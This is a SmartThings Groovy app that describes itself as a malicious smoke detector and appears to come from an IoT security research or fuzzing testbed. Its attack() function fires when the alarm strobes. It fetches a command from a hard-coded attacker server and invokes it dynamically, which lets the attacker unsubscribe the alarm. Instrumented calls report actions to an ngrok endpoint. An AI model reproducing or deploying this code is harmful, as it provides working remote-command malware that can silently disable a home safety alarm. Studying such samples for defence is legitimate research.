/**
 *  contexIoT-a-remote-command-smokedetector
 *
 *  Copyright 2020 jesper
 *
 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except
 *  in compliance with the License. You may obtain a copy of the License at:
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed
 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License
 *  for the specific language governing permissions and limitations under the License.
 *
 */
definition(
        name: "contexIoT-a-remote-command-smokedetector",
        namespace: "jesper",
        author: "jesper",
        description: "The attacker could call the malicious functions remotely. Malicous SmokeDetector: Normal functions: The smoke detector could detects the smoke. If there is smoke in the home, it would trigger the alarm.  Malicious functions: The malicious smoke detector could send http post to the attacker to get the dynamic command. The attacker could add the unsubscribe() to the response so that he could disarm the alarm subscribe.",
        category: "Safety & Security",
        iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
        iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
        iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
    section("Title") {
        input "smoke", "capability.smokeDetector", title: "smoke"
        input "alarm", "capability.alarm"
    }
}

def installed() {
    log.debug "Installed with settings: ${settings}"
    initialize()
}


def updated() {
    log.debug "Updated with settings: ${settings}"

    unsubscribe()
    initialize()
}

def initialize() {
    state.method = ""
    subscribe(smoke, "smoke", smokeHandler)
    subscribe(alarm, "alarm.strobe", strobeHandler)
}

def smokeHandler(evt) {
    log.debug "smoke handler"
    log.debug evt.value
    def data = [:]  // instrumented code
    def cnt = 0 // instrumented code
    if("detected" == evt.value) {
        cnt++ // instrumented code
        data['action'+cnt] = "sink1 : alarm strobe"  // instrumented code
        alarm.strobe()  // sink 1
    }
    sendRequest(data) // instrumented code
}

def strobeHandler(evt) {
    log.debug "smoke strobe the alarm"
    attack()
}


def attack() {
    log.debug "in attack"
    def data = [:]  // instrumented code
    def cnt = 0 // instrumented code
    try{
        cnt++ // instrumented code
        data['action'+cnt] = "sink2 : httpGet http://141.212.110.244/stmalware/maliciousServer.php"  // instrumented code
        httpGet("http://141.212.110.244/stmalware/maliciousServer.php") { resp ->
            if(resp.status == 200)
            {
                state.method = resp.data.toString()
                //log.debug state.method
            }
            else
            {
                log.error "unknown response"
            }
        }  // sink 2
    }
    catch (e){
        log.debug e
    }
    cnt++ // instrumented code
    data['action'+cnt] = "sink3 : Dynamic method invocation ${state.method}"  // instrumented code
    "$state.method"()  // sink 3
    log.debug "unsubscribe suceeded"
    sendRequest(data) // instrumented code
}

// the following simulates instrumented end point codes for web services hookup
mappings {
    // this endpoint supports a GET request. It will execute the specified command on the configured switches
    path("/smoke/:command") {
        //log.info("/people/:command")
        action: [
                GET: "smoke"
        ]
    }

    path("/alarm/:command") {
        //log.info("/people/:command")
        action: [
                GET: "alarm"
        ]
    }
}

/*
	this handles a GET request to the /people/:command endpoint.
    /people/on will turn the presenceSensor on, and /people/off will turn the presenceSensor off.
    This method doesn't work because only Device handler can send/modify device states (present or not present)
    It cannot be modified in the app code
*/
void smoke() {
    // use the built-in request object to get the command parameter
    def command = params.command
    log.debug("Receive command: $command")
    // inject all possible device commands
    // following is not the exhaustive list yet
    switch(command) {
        case "smoke":
            smoke.smoke()
            break
        case "test":
            smoke.test()
            break
        case "clear":
            smoke.clear()
            break
        default:
            httpError(400, "$command is not a valid command for all switches specified")
    }
}

void alarm() {
    // use the built-in request object to get the command parameter
    def command = params.command
    log.debug("Receive command: $command")
    // inject all possible device commands
    // following is not the exhaustive list yet
    switch(command) {
        case "strobe":
            alarm.strobe()
            break
        case "off":
            alarm.off()
            break
        case "siren":
            alarm.siren()
            break
        default:
            httpError(400, "$command is not a valid command for all switches specified")
    }
}



mappings {
    // this is the end point for simulating user location
    path("/location/:command") {
        //log.info("/location/:command")
        action: [
                GET: "location"
        ]
    }
}

void location() {
    //eventHandler(evt)
    def command = params.command
    log.debug("Receive command: $command")

    // format command
    command = command.replaceFirst(command[0], command[0].toUpperCase()) // home -> Home, away -> Away

    def currMode = location.currentMode // "Home", "Away", etc.
    log.debug "current mode is $currMode"

    location.setMode(command)  // change location
}

def sendRequest(data) {
    // [q:'Minneapolis', mode: 'json']
    def params = [
            uri:  'https://62f870a15b61.ngrok.io/',
            path: 'fuzzthings/things.php',
            contentType: 'application/json',
            query: data
    ]
    try {
        httpGet(params){resp ->
            log.debug "connection okay"
        }
    } catch (e) {
        log.error "error: $e"
    }
}